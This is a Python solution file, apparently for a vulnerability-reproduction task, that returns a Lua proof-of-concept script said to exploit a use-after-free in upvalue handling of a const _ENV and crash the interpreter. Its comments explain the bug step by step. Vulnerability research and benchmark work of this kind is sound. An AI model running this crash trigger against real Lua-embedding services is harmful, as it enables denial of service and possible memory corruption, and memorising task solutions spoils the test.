import textwrap

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is that when a <const> _ENV variable is captured
        # as an upvalue by a closure, the upvalue is not correctly "closed"
        # when the outer function returns. It is left pointing to the
        # now-invalid stack frame of the outer function.
        #
        # This PoC works as follows:
        # 1. Define a function `f` that declares a local constant `_ENV` table.
        # 2. Inside `f`, define an inner function `g` that accesses a global
        #    variable, which forces `g` to capture `_ENV` as an upvalue.
        # 3. `f` returns the closure `g`. At this point, `f`'s stack frame is
        #    deallocated, but the bug leaves `g`'s upvalue pointing to it.
        # 4. Call another function `h` whose stack frame reuses the memory
        #    of `f`'s frame. `h` defines local variables, overwriting the
        #    stale pointer in `g`'s upvalue with an integer.
        # 5. Trigger garbage collection. The original `_ENV` table is no longer
        #    properly rooted by `g` and gets collected.
        # 6. Call the closure `g`. The Lua VM will attempt to use the corrupted
        #    upvalue. It reads the integer from the stack and tries to
        #    dereference it as a pointer to a table, causing a segmentation
        #    fault and crashing the interpreter.
        poc_code = """
        function f()
          local _ENV <const> = {}
          function g()
            return a
          end
          return g
        end

        local g = f()

        function h()
          local x = 1
        end
        h()

        collectgarbage("collect")

        g()
        """
        return textwrap.dedent(poc_code).strip().encode('utf-8')